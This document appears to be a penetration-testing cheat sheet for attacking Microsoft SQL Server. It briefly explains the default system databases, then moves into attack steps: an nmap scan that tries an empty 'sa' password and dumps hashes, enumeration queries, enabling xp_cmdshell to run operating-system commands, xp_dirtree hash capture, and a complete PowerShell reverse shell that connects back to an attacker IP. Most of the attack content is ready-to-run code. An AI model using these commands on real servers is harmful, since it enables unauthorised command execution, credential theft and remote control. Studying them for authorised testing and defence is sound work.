https://juggernaut-sec.com/mssql/

[Microsoft SQL](https://www.microsoft.com/en-us/sql-server/sql-server-2019) (`MSSQL`) is Microsoft's SQL-based relational database management system. Unlike MySQL, which we discussed in the last section, MSSQL is closed source and was initially written to run on Windows operating systems. It is popular among database administrators and developers when building applications that run on Microsoft's .NET framework due to its strong native support for .NET. There are versions of MSSQL that will run on Linux and MacOS, but we will more likely come across MSSQL instances on targets running Windows.

#### MSSQL Databases
MSSQL has default system databases that can help us understand the structure of all the databases that may be hosted on a target server. Here are the default databases and a brief description of each:

|Default System Database|Description|
|---|---|
|`master`|Tracks all system information for an SQL server instance|
|`model`|Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database|
|`msdb`|The SQL Server Agent uses this database to schedule jobs & alerts|
|`tempdb`|Stores temporary objects|
|`resource`|Read-only database containing system objects included with SQL server|
```
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

```sql
-- Current user
SELECT SYSTEM_USER;
-- Connected login
SELECT ORIGINAL_LOGIN();
-- Current database
SELECT DB_NAME();
-- All databases
SELECT name FROM master.sys.databases;
-- SQL Server version
SELECT @@VERSION;
```

User Enumeration
```sql
-- Current user's roles
SELECT IS_SRVROLEMEMBER('sysadmin');  -- 1 if yes
-- All logins
SELECT name, type_desc, is_disabled FROM sys.server_principals;
-- All database users
SELECT name FROM sys.database_principals WHERE type IN ('S', 'U');
-- Role memberships
SELECT r.name AS role_name, m.name AS member_name
FROM sys.database_role_members rm
JOIN sys.database_principals r ON rm.role_principal_id = r.principal_id
JOIN sys.database_principals m ON rm.member_principal_id = m.principal_id;
```

Objects
```sql
-- Tables in current database
SELECT name FROM sys.tables;
-- Columns in a specific table
SELECT name FROM sys.columns WHERE object_id = OBJECT_ID('your_table_name');
-- Stored procedures
SELECT name FROM sys.procedures;
-- Linked servers
EXEC sp_linkedservers;
-- Check for common sensitive tables
SELECT name FROM sysobjects WHERE xtype='U' AND name LIKE '%user%';

```

```sql
-- Check if xp_cmdshell is enabled
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell';
-- Enable xp_cmdshell (if sysadmin)
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
-- Run a command (if xp_cmdshell is enabled)
EXEC xp_cmdshell 'whoami';
-- Check current execution context
SELECT SYSTEM_USER, SESSION_USER, USER_NAME();
```

With access to the sql shell `xp_dirtree {path}` can be utilized to send an SMB request which can reveal hashes.

```sql
EXEC xp_cmdshell 'powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient(''10.10.14.133'',1111);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + ''PS '' + (pwd).Path + ''> ''; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"';
```

```bash
mssqlpwner interactive DOMAIN/user:password@IP
```